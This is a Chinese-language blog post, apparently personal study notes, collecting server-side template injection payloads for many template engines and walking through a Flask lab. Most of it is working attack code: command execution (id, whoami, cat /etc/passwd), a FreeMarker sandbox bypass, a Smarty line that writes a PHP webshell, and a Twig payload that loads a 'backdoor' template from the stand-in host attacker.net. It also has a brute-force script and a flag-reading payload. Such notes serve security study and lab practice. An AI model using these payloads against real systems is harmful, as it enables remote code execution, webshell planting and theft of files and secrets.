@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>2023/08/10：ssti笔记 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;pentesting-web&#x2F;ssti-server-side-template-injection 模板类型判断  可用判断语句$&amp;#123;&amp;#123;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023&#x2F;08&#x2F;10：ssti笔记">
+<meta property="og:url" content="http://example.com/2023/08/10/sstinote/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="https:&#x2F;&#x2F;book.hacktricks.xyz&#x2F;pentesting-web&#x2F;ssti-server-side-template-injection 模板类型判断  可用判断语句$&amp;#123;&amp;#123;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/08/10/sstinote/ssti.png">
+<meta property="og:image" content="http://example.com/2023/08/10/sstinote/ssti2.png">
+<meta property="article:published_time" content="2023-08-10T12:33:32.000Z">
+<meta property="article:modified_time" content="2023-08-10T14:34:29.728Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/08/10/sstinote/ssti.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sstinote" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/08/10/sstinote/" class="article-date">
+  <time datetime="2023-08-10T12:33:32.000Z" itemprop="datePublished">2023-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2023/08/10：ssti笔记
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></p>
+<h2 id="模板类型判断"><a href="#模板类型判断" class="headerlink" title="模板类型判断"></a>模板类型判断</h2><img src="/2023/08/10/sstinote/ssti.png" class="">
+<img src="/2023/08/10/sstinote/ssti2.png" class="">
+<p>可用判断语句<code>$&#123;&#123;<%[%'"&#125;&#125;%\</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">#&#123;7*7&#125;</span><br><span class="line">*&#123;7*7&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="Java-Basic-injection"><a href="#Java-Basic-injection" class="headerlink" title="Java - Basic injection"></a>Java - Basic injection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;7*7&#125;</span><br><span class="line">$&#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;class.getClassLoader()&#125;</span><br><span class="line">$&#123;class.getResource(&quot;&quot;).getPath()&#125;</span><br><span class="line">$&#123;class.getResource(&quot;../../../../../index.htm&quot;).getContent()&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Java-Retrieve-the-system’s-environment-variables"><a href="#Java-Retrieve-the-system’s-environment-variables" class="headerlink" title="Java - Retrieve the system’s environment variables"></a>Java - Retrieve the system’s environment variables</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Java-Retrieve-etc-passwd"><a href="#Java-Retrieve-etc-passwd" class="headerlink" title="Java - Retrieve /etc/passwd"></a>Java - Retrieve /etc/passwd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#x27;cat etc/passwd&#x27;)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="FreeMarker-Java"><a href="#FreeMarker-Java" class="headerlink" title="FreeMarker (Java)"></a>FreeMarker (Java)</h3><p>判断类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = &#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;7*7&#125; = 49</span><br><span class="line">#&#123;7*7&#125; = 49 -- (legacy)</span><br><span class="line">$&#123;7*&#x27;7&#x27;&#125; Nothing</span><br><span class="line">$&#123;foobar&#125;</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex = &quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123; ex(&quot;id&quot;)&#125;</span><br><span class="line">[#assign ex = &#x27;freemarker.template.utility.Execute&#x27;?new()]$&#123; ex(&#x27;id&#x27;)&#125;</span><br><span class="line">$&#123;&quot;freemarker.template.utility.Execute&quot;?new()(&quot;id&quot;)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#x27;/home/carlos/my_password.txt&#x27;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Freemarker-Sandbox-bypass（版本低于2-3-30）"><a href="#Freemarker-Sandbox-bypass（版本低于2-3-30）" class="headerlink" title="Freemarker - Sandbox bypass（版本低于2.3.30）"></a>Freemarker - Sandbox bypass（版本低于2.3.30）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line">&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line">&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Jinjava-Java"><a href="#Jinjava-Java" class="headerlink" title="Jinjava (Java)"></a>Jinjava (Java)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Smarty-PHP"><a href="#Smarty-PHP" class="headerlink" title="Smarty (PHP)"></a>Smarty (PHP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">&#123;php&#125;echo `id`;&#123;/php&#125; //deprecated in smarty v3</span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br><span class="line">&#123;system(&#x27;ls&#x27;)&#125; // compatible v3</span><br><span class="line">&#123;system(&#x27;cat index.php&#x27;)&#125; // compatible v3</span><br></pre></td></tr></table></figure>
+<h3 id="Twig-PHP"><a href="#Twig-PHP" class="headerlink" title="Twig (PHP)"></a>Twig (PHP)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = 49</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; = 49</span><br><span class="line">&#123;&#123;1/0&#125;&#125; = Error</span><br><span class="line">&#123;&#123;foobar&#125;&#125; Nothing</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#Get Info</span><br><span class="line">&#123;&#123;_self&#125;&#125; #(Ref. to current application)</span><br><span class="line">&#123;&#123;_self.env&#125;&#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(&#x27;,&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">#File read</span><br><span class="line">&quot;&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&quot;@</span><br><span class="line"></span><br><span class="line">#Exec code</span><br><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;system&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id;uname -a;hostname&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat\x20/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;[&#x27;cat$IFS/etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Handlebars-NodeJS"><a href="#Handlebars-NodeJS" class="headerlink" title="Handlebars (NodeJS)"></a>Handlebars (NodeJS)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;this.push &quot;return require(&#x27;child_process&#x27;).exec(&#x27;whoami&#x27;);&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;this&#125;&#125;</span><br><span class="line">          &#123;&#123;/with&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/with&#125;&#125;</span><br><span class="line">    &#123;&#123;/with&#125;&#125;</span><br><span class="line">  &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br><span class="line"></span><br><span class="line">URLencoded:</span><br><span class="line">%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D</span><br></pre></td></tr></table></figure>
+<h3 id="ERB-Ruby"><a href="#ERB-Ruby" class="headerlink" title="ERB (Ruby)"></a>ERB (Ruby)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = &#123;&#123;7*7&#125;&#125;</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&lt;%= 7*7 %&gt; = 49</span><br><span class="line">&lt;%= foobar %&gt; = Error</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= system(&quot;whoami&quot;) %&gt; #Execute code</span><br><span class="line">&lt;%= Dir.entries(&#x27;/&#x27;) %&gt; #List folder</span><br><span class="line">&lt;%= File.open(&#x27;/etc/passwd&#x27;).read %&gt; #Read file</span><br><span class="line"></span><br><span class="line">&lt;%= system(&#x27;cat /etc/passwd&#x27;) %&gt;</span><br><span class="line">&lt;%= `ls /` %&gt;</span><br><span class="line">&lt;%= IO.popen(&#x27;ls /&#x27;).readlines()  %&gt;</span><br><span class="line">&lt;% require &#x27;open3&#x27; %&gt;&lt;% @a,@b,@c,@d=Open3.popen3(&#x27;whoami&#x27;) %&gt;&lt;%= @b.readline()%&gt;</span><br><span class="line">&lt;% require &#x27;open4&#x27; %&gt;&lt;% @a,@b,@c,@d=Open4.popen4(&#x27;whoami&#x27;) %&gt;&lt;%= @c.readline()%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Tornado-Python"><a href="#Tornado-Python" class="headerlink" title="Tornado (Python)"></a>Tornado (Python)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = 49</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&#123;&#123;foobar&#125;&#125; = Error</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; = 7777777</span><br></pre></td></tr></table></figure>
+<h3 id="Jinja2-Python"><a href="#Jinja2-Python" class="headerlink" title="Jinja2 (Python)"></a>Jinja2 (Python)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; = Error</span><br><span class="line">$&#123;7*7&#125; = $&#123;7*7&#125;</span><br><span class="line">&#123;&#123;foobar&#125;&#125; Nothing</span><br><span class="line">&#123;&#123;4*4&#125;&#125;[[5*5]]</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125; = 7777777</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123;settings.SECRET_KEY&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Jinja2-Template-format"><a href="#Jinja2-Template-format" class="headerlink" title="Jinja2 - Template format"></a>Jinja2 - Template format</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;layout.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">  &lt;ul&gt;</span><br><span class="line">  &#123;% for user in users %&#125;</span><br><span class="line">    &lt;li&gt;&lt;a href=&quot;&#123;&#123; user.url &#125;&#125;&quot;&gt;&#123;&#123; user.username &#125;&#125;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="xss相关"><a href="#xss相关" class="headerlink" title="xss相关"></a>xss相关</h2><p>Go语言允许定义一整个模板且之后使用，可能让payload变成这样：<code>&#123;&#123;define "T1"&#125;&#125;&lt;script&gt;alert(1)&lt;/script&gt;&#123;&#123;end&#125;&#125; &#123;&#123;template "T1"&#125;&#125;</code></p>
+<h2 id="RCE相关"><a href="#RCE相关" class="headerlink" title="RCE相关"></a>RCE相关</h2><p>在Go语言中可以以类似<code>&#123;&#123; .System "ls" &#125;&#125;</code>使用命令<br>需要源代码类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">func (p Person) Secret (test string) string &#123;</span><br><span class="line">	out, _ := exec.Command(test).CombinedOutput()</span><br><span class="line">	return string(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="ssti-lab-flask-构造payload相关"><a href="#ssti-lab-flask-构造payload相关" class="headerlink" title="ssti-lab(flask)构造payload相关"></a>ssti-lab(flask)构造payload相关</h2><h3 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__class__</span><br></pre></td></tr></table></figure>
+<p>用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 是类的一个内置属性，表示类的类型； 也是类的实例的属性，表示实例对象的类。<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__bases__</span><br></pre></td></tr></table></figure>
+<p>用来查看类的基类，也可以使用数组索引来查看特定位置的值。 通过该属性可以查看该类的所有直接父类，该属性返回所有直接父类组成的元组。<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__bases__</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__mro__</span><br></pre></td></tr></table></figure>
+<p>获取基类，包含了当前类对象所有继承的基类<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()</span><br></pre></td></tr></table></figure>
+<p>获取当前类的所有子类，即Object的子类。通过拿到Object的子类，使用其中的一些函数，进行文件读取或者命令执行。<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__</span><br></pre></td></tr></table></figure>
+<p>重载子类，获取子类初始化的属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__</span><br></pre></td></tr></table></figure>
+<p>函数会以字典的形式返回当前位置的全部全局变量<br>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os._wrap_close.__init__.__globals__   可以获取到os中的一些函数，进行文件读取。</span><br></pre></td></tr></table></figure>
+<h3 id="解题示例"><a href="#解题示例" class="headerlink" title="解题示例"></a>解题示例</h3><h4 id="一句话形式"><a href="#一句话形式" class="headerlink" title="一句话形式"></a>一句话形式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;//依不同题目替换此行</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1:5000/level/1&quot;</span><br><span class="line"></span><br><span class="line">for i in range(300):</span><br><span class="line">    data = &#123;&quot;code&quot;: &#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;+ str(i) +&#x27;]&#125;&#125;&#x27;&#125;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        #print(data)</span><br><span class="line">        #print(response.text)</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            if &quot;_wrap_close&quot; in response.text:</span><br><span class="line">                print(i,&quot;-----&gt;&quot;,response.text)</span><br><span class="line">                break</span><br><span class="line">    except :</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+<p>构造出来的payload示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[147].__init__.__globals__[&#x27;popen&#x27;](&#x27;type flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/10/sstinote/" data-id="cll59g8v30004agudgv578nbg" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/08/10/uploadnote/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2023/08/10：upload笔记
+        
+      </div>
+    </a>
+  
+  
